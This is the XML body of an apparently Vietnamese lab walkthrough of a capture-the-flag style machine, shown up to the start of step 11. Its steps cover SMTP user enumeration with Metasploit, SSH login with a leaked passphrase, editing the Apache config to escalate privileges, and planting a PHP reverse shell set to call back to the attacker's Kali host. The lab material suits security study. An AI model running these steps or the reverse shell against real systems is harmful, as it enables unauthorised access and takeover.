    <w:p w14:paraId="00039710" w14:textId="77777777" w:rsidR="00CA3328" w:rsidRPr="00CA3328" w:rsidRDefault="00CA3328" w:rsidP="00CA3328">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r w:rsidRPr="00CA3328">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Mục đích:</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA3328">
        <w:t xml:space="preserve"> Tìm kiếm thông tin trao đổi nội bộ có thể chứa tài khoản, mật khẩu hoặc manh mối phục vụ quá trình kiểm thử.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C6FDE2" w14:textId="77777777" w:rsidR="00CA3328" w:rsidRPr="00CA3328" w:rsidRDefault="00CA3328" w:rsidP="00CA3328">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r w:rsidRPr="00CA3328">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Kết quả:</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA3328">
        <w:t xml:space="preserve"> Chủ đề của kênh tiết lộ mật khẩu dùng để đăng nhập vào dịch vụ quản lý máy in:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01067C02" w14:textId="77777777" w:rsidR="00CA3328" w:rsidRPr="00CA3328" w:rsidRDefault="00CA3328" w:rsidP="00CA3328">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r w:rsidRPr="00CA3328">
        <w:t>mostmachineshaveasupersecurekeyandalongpassphrase</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B80A86" w14:textId="77777777" w:rsidR="00CA3328" w:rsidRDefault="00CA3328">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EBB45E5" w14:textId="7D650923" w:rsidR="00B57906" w:rsidRDefault="00CA3328">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="50798490" wp14:editId="4B2D3F8A">
            <wp:extent cx="6309360" cy="749300"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="86815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51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br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="281C7442" wp14:editId="79D74274">
            <wp:extent cx="6309360" cy="2349500"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="91099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92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D441" w14:textId="27ABE394" w:rsidR="00CA3328" w:rsidRDefault="00CA3328">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="08466489" wp14:editId="2EFB4108">
            <wp:extent cx="6309360" cy="2353945"/>
            <wp:effectExtent l="0" t="0" r="0" b="8255"/>
            <wp:docPr id="10384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9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32AB" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Bước 6. Xử lý danh sách username</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582580BE" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Lọc dữ liệu username từ tệp đầu vào và lưu danh sách đã xử lý vào usernames2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C8E2D3" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66857399" w14:textId="227B3EBD" w:rsidR="00CA3328" w:rsidRPr="00CA3328" w:rsidRDefault="00CA3328">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r w:rsidR="006E4573">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA3328">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i usernames</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B27E6A" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cat usernames | awk '{print $1}' | sed s/\'s_Personal_Printer// &gt; usernames2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14A8601C" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Tạo được tệp usernames2 chứa danh sách tên người dùng cần kiểm tra.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AEF49D7" w14:textId="77777777" w:rsidR="006E4573" w:rsidRDefault="006E4573">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2C969D67" wp14:editId="1D5E9138">
            <wp:extent cx="6309360" cy="1647190"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="137456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66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A8BA" w14:textId="3B000CE9" w:rsidR="00B57906" w:rsidRDefault="006E4573">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0BFC298E" wp14:editId="4D148480">
            <wp:extent cx="6309360" cy="3183255"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="189541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147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br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EDF9AF9" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Bước 7. Liệt kê người dùng qua SMTP bằng Metasploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03490D2A" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Sử dụng module smtp_enum để kiểm tra các tài khoản tồn tại trên dịch vụ SMTP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248ABB68" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DB0A7D" w14:textId="77777777" w:rsidR="008B3E8C" w:rsidRDefault="00000000" w:rsidP="008B3E8C">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>use auxiliary/scanner/smtp/smtp_enum</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>show options</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>set RHOSTS 192.168.56.125</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="006E4573" w:rsidRPr="006E4573">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>set USER_FILE /home/kali/usernames2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4269B8" w14:textId="450DEA1C" w:rsidR="006E4573" w:rsidRPr="008B3E8C" w:rsidRDefault="008B3E8C" w:rsidP="008B3E8C">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="008B3E8C">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Kết quả: Dịch vụ SMTP Postfix trên cổng 25 phản hồi và xác nhận hai tên người dùng có khả năng tồn tại là Patrick và Qiu</w:t>
      </w:r>
      <w:r w:rsidRPr="008B3E8C">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E4573">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="09F36B19" wp14:editId="7D8F1E41">
            <wp:extent cx="6309360" cy="3176905"/>
            <wp:effectExtent l="0" t="0" r="0" b="4445"/>
            <wp:docPr id="14509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86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0891" w14:textId="4804CA5F" w:rsidR="00B57906" w:rsidRDefault="006E4573">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7AD47DE4" wp14:editId="6DA86917">
            <wp:extent cx="6309360" cy="972820"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="191164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448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br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CDB849B" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Bước 8. Kiểm tra quyền sudo và các tệp cấu hình</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C7B17A9" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Đăng nhập lại bằng SSH, kiểm tra quyền sudo và tìm các tệp cấu hình có quyền truy cập bất thường.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="594770DB" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="592669CE" w14:textId="77777777" w:rsidR="008B3E8C" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ssh patrick@192.168.56.125 -i id_rsa</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32051E2B" w14:textId="76F6ED6D" w:rsidR="008B3E8C" w:rsidRPr="00CA3328" w:rsidRDefault="008B3E8C" w:rsidP="008B3E8C">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   pass: </w:t>
      </w:r>
      <w:r w:rsidRPr="00CA3328">
        <w:t>mostmachineshaveasupersecurekeyandalongpassphrase</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C15FD2" w14:textId="09632F71" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>sudo -l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \; 2&gt;/dev/null</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>find /etc/ -maxdepth 2 -perm -2 -name *.conf -type f -exec ls -la {} \; 2&gt;/dev/null</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>less /etc/apache2/apache2.conf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2985C219" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Phát hiện cấu hình Apache và thông tin tài khoản chạy dịch vụ có thể được tận dụng để leo thang đặc quyền.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644B3546" w14:textId="77777777" w:rsidR="008B3E8C" w:rsidRDefault="008B3E8C">
      <w:pPr>
        <w:spacing w:after="80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09784341" wp14:editId="1AC9CF5D">
            <wp:extent cx="6309360" cy="2583180"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="133249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907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308D" w14:textId="1BEC3130" w:rsidR="00B57906" w:rsidRDefault="008B3E8C">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4F27C971" wp14:editId="5124E1BE">
            <wp:extent cx="6309360" cy="3979545"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="99753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377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br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C799BE" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Bước 9. Thay đổi tài khoản chạy Apache</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1861E611" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Thay đổi User và Group của Apache từ biến mặc định sang tài khoản qiu theo nội dung bài lab.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC3DE0F" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="720999D9" w14:textId="4C93E8EA" w:rsidR="008B3E8C" w:rsidRPr="008B3E8C" w:rsidRDefault="008B3E8C">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008B3E8C">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>vi /etc/apache2/apache2.conf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2AD505" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>User ${APACHE_RUN_USER}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Group ${APACHE_RUN_GROUP}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>User qiu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Group qiu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="753AE61F" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Apache được cấu hình chạy dưới tài khoản qiu sau khi dịch vụ được khởi động lại.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302C0CBD" w14:textId="35F5785D" w:rsidR="00B57906" w:rsidRDefault="008B3E8C">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="25174A79" wp14:editId="7DA5F09D">
            <wp:extent cx="6309360" cy="1663700"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="64263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374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br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F18966" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Bước 10. Chuẩn bị PHP reverse shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6130E69E" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Sao chép PHP reverse shell vào thư mục web và cấu hình địa chỉ máy Kali cùng cổng kết nối.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C0C3010" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A1CE1E0" w14:textId="77777777" w:rsidR="008B3E8C" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cp /usr/share/webshells/php/php-reverse-shell.php /var/www/html/revshell.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9CA888" w14:textId="6060750A" w:rsidR="00B57906" w:rsidRDefault="008B3E8C">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>vi /var/www/html/revshell.php</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>$ip = '192.168.56.122';  // CHANGE THIS</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>$port = 4448;       // CHANGE THIS</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="16FA57A1" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Tạo tệp revshell.php và cấu hình reverse shell kết nối về máy Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35CA5E9A" w14:textId="3F17B34F" w:rsidR="00B57906" w:rsidRDefault="005D5D0D">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0B46BF56" wp14:editId="50119FCE">
            <wp:extent cx="6309360" cy="1668145"/>
            <wp:effectExtent l="0" t="0" r="0" b="8255"/>
            <wp:docPr id="107365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514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br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F9BFAFC" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
